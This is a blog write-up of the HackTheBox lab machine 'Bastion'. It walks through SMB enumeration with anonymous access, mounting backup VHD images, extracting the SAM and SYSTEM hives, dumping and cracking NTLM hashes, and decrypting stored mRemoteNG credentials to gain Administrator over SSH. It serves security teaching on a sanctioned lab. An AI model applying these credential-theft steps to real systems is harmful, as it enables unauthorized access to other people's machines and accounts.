---
layout:     post
title:      Bastion
date:       2019-01-19 18:02:19
summary:    Write-up of HackTheBox's Bastion.
categories: writeup
thumbnail: flag
tags:
 - hackthebox
 - writeup
 - walkthrough

---

![](/images/bastion/infocard.png)

# Initial Scan

{% highlight plaintext %}
root@kali:~/HTB/Bastion# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
Nmap scan report for 10.10.10.134
Host is up (0.053s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -32m09s, deviation: 1h09m14s, median: 7m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-22T14:34:30+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-22 08:34:28
|_  start_date: 2019-09-22 08:32:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds
{% endhighlight %}

Not much to look into aside from SMB.

# Enumerating SMB

It's always worth testing to see if SMB permits null (aka anonymous) sessions. __We need a share__ to try authenticating to first. So we list out the shares.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# smbclient -L \\10.10.10.134
Enter WORKGROUP\root's password:
    Sharename       Type      Comment                                                                                           
    ---------       ----      -------                                                                                           
    ADMIN$          Disk      Remote Admin                                                                                      
    Backups         Disk                                                                                                        
    C$              Disk      Default share                                                                                     
    IPC$            IPC       Remote IPC 
    
{% endhighlight %}

`ADMIN$`, `C$`, and `IPC$` are all default shares. `Backups` is the only one that stands out. I attempt to authenticate to it with no credentials.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# smbclient \\\\10.10.10.134\\Backups
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2745314 blocks available

{% endhighlight %}

Our null session worked. We have read access to the `Backups` share.

Although there aren't that many files in the share, some are massive. Here's a quick look of the interesting directory `WindowsImageBackup`.

{% highlight plaintext %}
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
  ..                                  D        0  Fri Feb 22 07:45:32 2019                                                          
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019                                                
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019                                              
  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
                                                            
  < . . . snip . . . >

{% endhighlight %}

VHD files? Definitely something to look at. But `5418299392` blocks? That's over _two terabytes_. We need a way to enumerate the VHDs without downloading them entirely.

# Mounting shares and VHD files

If we mount the share, we can view it as if it were part of our own file system.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
Password for anonymous@//10.10.10.134/Backups:  
{% endhighlight %}

![](/images/bastion/image2.png)

Those juicy VHD files, though, aren't readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install `guestmount`.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# apt-get install libguestfs-tools
{% endhighlight %}

Then we create a new directory as the mountpoint.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# mkdir vhd1
{% endhighlight %}

And we mount the VHD file.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# guestmount --add "/root/HTB/Bastion/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/HTB/Bastion/vhd1 -v
{% endhighlight %}

Now we can browse through the file system as if it were part of our own.

![](/images/bastion/image3.png)

_Note: One of the VHD files wouldn't mount properly. Turns out it isn't necessary to mount anyway._

Now with read access to the VHD, my first instinct is to go for the __flags__, but there's nothing at `C:\Users\L4mpje\Desktop` or `C:\Users\Administrator\Desktop`. So we clearly don't have the right access just yet.

Next thing to do would be to search for __user credentials__ (remember the open SSH port?). After we've checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.

# SAM and SECURITY

Depending on your version of Windows, these can be in a few different locations. Here, they're in `C:\Windows\System32\config`.

{% highlight plaintext %}
root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# dir
< . . . snip . . . >
SAM
SAM.LOG
SAM.LOG1
SAM.LOG2
SECURITY
< . . . snip . . . >
{% endhighlight %}

I copy them from the mounted drive to my Kali box.

{% highlight plaintext %}
root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SAM /root/HTB/Bastion
root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SYSTEM /root/HTB/Bastion
{% endhighlight %}

To get the hashes, I use `samdump2` and pass the `SYSTEM` and `SAM` files as arguments.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# samdump2 SYSTEM SAM -o hashes.txt
root@kali:~/HTB/Bastion# cat hashes.txt
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
{% endhighlight %}

The L4mpje hash takes seconds to crack with `hashcat`.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
{% endhighlight %}

The password for use L4mpje is __bureaulampje__. The Administrator and Guest account hashes are marked as `*disabled*`, so this is the best we'll get.

![](/images/bastion/image4.png)

To get in, we `ssh` as __L4mpje@10.10.10.134__ with the recovered password.

{% highlight plaintext %}
root@kali:~# ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

l4mpje@BASTION C:\Users\L4mpje>    
{% endhighlight %}

The user flag is on L4mpje's Desktop.

{% highlight plaintext %}
l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt                            
9bfe############################                                                   
{% endhighlight %}

# Privilege Escalation: mRemoteNG Credentials

With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, `mRemoteNG` stands out.

{% highlight plaintext %}
l4mpje@BASTION C:\>dir "Program Files (x86)"                                    
 Volume in drive C has no label.                                                
 Volume Serial Number is 0CB3-C487                                              

 Directory of C:\Program Files (x86)                                            

22-02-2019  15:01    <DIR>          .                                           
22-02-2019  15:01    <DIR>          ..                                          
16-07-2016  15:23    <DIR>          Common Files                                
23-02-2019  10:38    <DIR>          Internet Explorer                           
16-07-2016  15:23    <DIR>          Microsoft.NET                               
22-02-2019  15:01    <DIR>          mRemoteNG                                   
23-02-2019  11:22    <DIR>          Windows Defender                            
23-02-2019  10:38    <DIR>          Windows Mail                                
23-02-2019  11:22    <DIR>          Windows Media Player                        
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                 
16-07-2016  15:23    <DIR>          Windows NT                                  
23-02-2019  11:22    <DIR>          Windows Photo Viewer                        
16-07-2016  15:23    <DIR>          Windows Portable Devices                    
16-07-2016  15:23    <DIR>          WindowsPowerShell                           
               0 File(s)              0 bytes                                   
              14 Dir(s)  11.244.994.560 bytes free                              
{% endhighlight %}

We can find the version number in the changelog file and look for a known exploit, but this doesn't get us very far. 

A search for "mRemoteNG stored credentials", however, results in [exactly what we're looking for](http://hackersvanguard.com/mremoteng-insecure-password-storage/):

> mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.

As the post shows, we can find an encrypted password (right beside __Username="Administrator"__) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.

{% highlight xml %}
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" . . . 
{% endhighlight %}

From here, you can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to [blog post](http://hackersvanguard.com/mremoteng-insecure-password-storage/)). 

What worked best for me was [mRemoteNG_Decrypt.py](https://github.com/haseebT/mRemoteNG-Decrypt). I copied the encrypted password and passed it as a string to get the plaintext credential.

{% highlight plaintext %}
root@kali:~/HTB/Bastion# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
{% endhighlight %}

From here, we simply have to SSH in as Administrator.

{% highlight plaintext %}
root@kali:~# ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password: 
{% endhighlight %}

And the root flag is in Administrator's Desktop folder.

{% highlight plaintext %}
administrator@BASTION C:\Users\Administrator> type Desktop\root.txt                                                             
9588############################
{% endhighlight %}